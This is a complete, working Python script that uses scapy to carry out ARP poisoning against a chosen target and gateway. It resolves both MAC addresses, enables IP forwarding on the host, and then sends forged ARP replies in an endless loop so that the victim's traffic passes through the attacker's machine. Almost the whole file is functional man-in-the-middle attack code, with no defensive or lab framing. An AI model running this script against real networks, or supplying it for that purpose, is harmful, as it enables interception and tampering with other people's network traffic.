import argparse
import scapy.all as scp
import os
#import netifaces
import signal
import sys
import threading
import time

#ARP Poison parameters
packet_count = 1000

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    resp, unans = scp.srp(scp.Ether(dst="ff:ff:ff:ff:ff:ff")/scp.ARP(pdst=ip_address), timeout = 2)
#    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[scp.ARP].hwsrc
    return None

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    while True:
        arp_gateway = scp.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        scp.send(arp_gateway)
        arp_target = scp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        scp.send(arp_target)
        time.sleep(2)

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target-ip", dest = "target_ip")
parser.add_argument("-g", "--gateway-ip", dest = "gateway_ip")
args = parser.parse_args()

#gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
target_ip = args.target_ip
gateway_ip = args.gateway_ip

#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
#Enable IP Forwarding on a mac
os.system("sysctl -w net.ipv4.ip_forward=1")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)

